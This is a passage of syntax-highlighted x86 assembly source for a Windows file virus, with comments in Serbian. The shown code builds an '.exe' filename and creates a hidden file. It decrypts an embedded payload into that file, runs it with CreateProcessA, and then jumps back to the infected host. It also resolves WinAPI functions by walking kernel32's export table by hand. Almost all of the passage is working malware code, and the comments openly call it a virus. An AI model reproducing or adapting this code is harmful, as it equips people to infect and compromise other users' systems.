        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nextchar</span><span class="sc0">             </span><span class="sc1">; ako nije slovo onda ga upiÑi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; ako je slovo uzmi prethodno (HAL &amp; IBM:)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; ako je slovo bilo 'a'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nextchar</span><span class="sc0">            </span><span class="sc1">; nije</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">             </span><span class="sc1">; jeste, uradi wrapping</span><span class="sc0">
</span><span class="sc5">nextchar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; dodaj joÑ extenziju '.exe'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6578652Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; zatvori string</span><span class="sc0">


</span><span class="sc1">;*******************************************************************</span><span class="sc0">
</span><span class="sc1">;*** Kreiraj fajl ako ga nema, zapiÑi u njega virus i zatvori ga ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************</span><span class="sc0">

</span><span class="sc1">; kreiraj fajl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">; edx = NULL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Arg6 = hTemplateFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc4">+</span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">     </span><span class="sc1">; Arg5 = dwFlagsAndAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">CREATE_NEW</span><span class="sc0">       </span><span class="sc1">; Arg4 = dwCreationDistribution</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Arg3 = lpSecurityAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                        </span><span class="sc1">; Arg2 = dwShareMode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">    </span><span class="sc1">; Arg1 = dwDesiredAccess</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; eax -&gt; filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg0 = lpFileName</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; call CreateFileA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">          </span><span class="sc1">; doÑlo je do greÑke ili virus veÜ postoji!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; nema greÑke, zapamti handle fajla</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; i stavi na stek poÑto treba kasnije za CloseHandle</span><span class="sc0">

</span><span class="sc1">; dekriptuj i upiÑi fajl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; Arg4 = lpOverlapped</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; eax -&gt; temp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg3 = lpNumberOfBytesWritten</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_addfile_size</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; Arg2 = nNumberOfBytesToWrite</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg1 = lpBuffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg0 = handle</span><span class="sc0">
</span><span class="sc1">; dekriptuj</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_kript</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">173</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
</span><span class="sc1">; upiÑi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call WriteFile</span><span class="sc0">

</span><span class="sc1">; zatvori kreiran fajl</span><span class="sc0">
</span><span class="sc1">;       push edx                ; Arg0 = handle (bilo ranije!)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call CloseHandle</span><span class="sc0">


</span><span class="sc1">;*******************************</span><span class="sc0">
</span><span class="sc1">;*** Startuje (kreiran) fajl ***</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">

</span><span class="sc1">;CreateProcess(proginame, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &amp;si, &amp;pi))</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">process_information</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg9 = lpProcessInformation</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">startup_info</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg8 = lpStartupInfo</span><span class="sc0">
</span><span class="sc1">;pripremi startupinfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">67</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">@b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; STARTF_FORCEOFFFEEDBACK</span><span class="sc0">
</span><span class="sc1">;ostatak</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg7 = lpCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg6 = lpEnvironment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">NORMAL_PRIORITY_CLASS</span><span class="sc0">        </span><span class="sc1">; Arg5 = dwCreationFlags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg4 = bInheritHandles</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg3 = lpThreadAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg2 = lpProcessAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Arg1 = lpCommandLine</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg0 = lpApplicationName</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; call CreateProcessA</span><span class="sc0">


</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc1">;*** Izaîi iz virusa i startuj host ***</span><span class="sc0">
</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; hop nazad na host</span><span class="sc0">


</span><span class="sc1">;************************</span><span class="sc0">
</span><span class="sc1">;*** MyGetProcAddress ***</span><span class="sc0">
</span><span class="sc1">;************************</span><span class="sc0">
</span><span class="sc1">; dobavlja adresu neke WinAPI f-je iz KERNEL32.DLL</span><span class="sc0">
</span><span class="sc1">; ulaz: eax -&gt; string sa imenom f-je iz kernel32.dll</span><span class="sc0">
</span><span class="sc1">;       esi = hmodule(kernel32.dll)</span><span class="sc0">
</span><span class="sc1">; izlaz: eax = adresa f-je</span><span class="sc0">
</span><span class="sc5">MyGetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Arg1 = LPCSTR lpProcName</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; Arg0 = hModule (KERNEL32.DLL)</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_data_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; call GetProcAddress</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; da li je f-ja naîena?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">virus_exit</span><span class="sc0">           </span><span class="sc1">; nije, skoÅi</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">



</span><span class="sc1">;*************************</span><span class="sc0">
</span><span class="sc1">;*** WinGetProcAddress ***</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">
</span><span class="sc1">; u sluÅaju da GetProcAddress nije uvezena, koristi se ova f-ja</span><span class="sc0">
</span><span class="sc1">; za dobavljanje adrese te f-je. MoÇe da sluÇi i za dobavljanje</span><span class="sc0">
</span><span class="sc1">; svih ostalih adresa, ali bolje da to Windows radi.</span><span class="sc0">
</span><span class="sc1">; ZnaÅi, ova f-ja je malo modifikovana tako da ide u prilog tome</span><span class="sc0">
</span><span class="sc1">; da se dobavlja samo adresa f-je GetProcAdress.</span><span class="sc0">
</span><span class="sc5">WinGetProcAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; uzmi hModule</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; Brza provera ispravnosti - ovde nam ne treba poÑto sigurno</span><span class="sc0">
</span><span class="sc1">; traÇimo f-ju iz validnog handlea kernel32.dll!</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;       cmp word ptr [edx], 'ZM'</span><span class="sc0">
</span><span class="sc1">;       jnz @@gpaExit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;       cmp dword ptr [edx], 'EP'</span><span class="sc0">
</span><span class="sc1">;       jnz @@gpaExit</span><span class="sc0">

</span><span class="sc1">; handle je validan - brza provera je proÑla OK</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; EDX sada pokazuje na poÅetak .edata</span><span class="sc0">
</span><span class="sc1">; [edx+12] -&gt; module name    RVA</span><span class="sc0">
</span><span class="sc1">; [edx+16] =  ordinal base</span><span class="sc0">
</span><span class="sc1">; [edx+20] =  number of addresses</span><span class="sc0">
</span><span class="sc1">; [edx+24] =  number of names</span><span class="sc0">
</span><span class="sc1">; [edx+28] -&gt; array of n address RVA</span><span class="sc0">
</span><span class="sc1">; [edx+32] -&gt; array of n names*  RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@gpaExit</span><span class="sc0">

</span><span class="sc1">; Proîi kroz sve stringove dok ne naîeÑ isti ili do kraja</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@@gpaLoop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;       mov ebx, [edi-4]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@@gpaCmpStr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@@gpaOrdinalFound</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@@gpaCheckNext</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@@gpaCmpStr</span><span class="sc0">

</span><span class="sc5">@@gpaCheckNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@@gpaLoop</span><span class="sc0">

</span><span class="sc1">; nije naîen string, vrati greÑku</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@@gpaExit</span><span class="sc0">

</span><span class="sc5">@@gpaOrdinalFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; najzad je naîeno ono Ñto se traÇi: (numNames - ECX) je ordinal</span><span class="sc0">
</span><span class="sc1">; funkcije Åiju adresu traÇimo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@@gpaExit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">




</span><span class="sc1">;********************</span><span class="sc0">
</span><span class="sc1">;*** Data sekcija ***</span><span class="sc0">
</span><span class="sc1">;********************</span><span class="sc0">
</span><span class="sc1">; ovde slede podaci koji se koriste</span><span class="sc0">
</span><span class="sc1">; stringovi WinAPI su kriptovani</span><span class="sc0">
</span><span class="sc1">; da bi se prostor iskoristio Ñto bolje, stringovi su preklopljeni</span><span class="sc0">
